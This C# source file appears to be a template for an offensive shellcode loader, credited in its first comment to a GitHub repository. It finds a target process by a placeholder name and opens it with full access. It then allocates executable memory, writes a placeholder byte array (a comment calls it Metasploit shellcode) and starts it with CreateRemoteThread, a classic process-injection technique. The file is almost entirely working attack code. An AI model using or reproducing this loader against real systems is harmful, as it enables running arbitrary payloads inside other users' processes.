//https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/Csharp/CreateRemoteThread.cs

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CreateRemoteThread_Loader
{
    public class CreateRemoteThread_Loader
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public static void Main(string[] args)
        {
            Process localByName = Process.GetProcessesByName("%%PROCESS%%")[0];

            IntPtr process_handle = OpenProcess(0x1F0FFF, false, localByName.Id);

            // The MessageBox %%VAR1%%, generated with Metasploit
             byte[] %%VAR1%% = new byte[%%LENGTH%%] {%%DATA%%};

            // Allocate a memory space in target process, big enough to store the %%VAR1%%
            IntPtr memory_allocation_variable = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(%%VAR1%%.Length), 0x00001000, 0x40);

            // Write the %%VAR1%%
            UIntPtr bytesWritten;
            WriteProcessMemory(process_handle, memory_allocation_variable, %%VAR1%%, (uint)(%%VAR1%%.Length), out bytesWritten);
            CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable, IntPtr.Zero, 0, IntPtr.Zero);

        }
    }
}
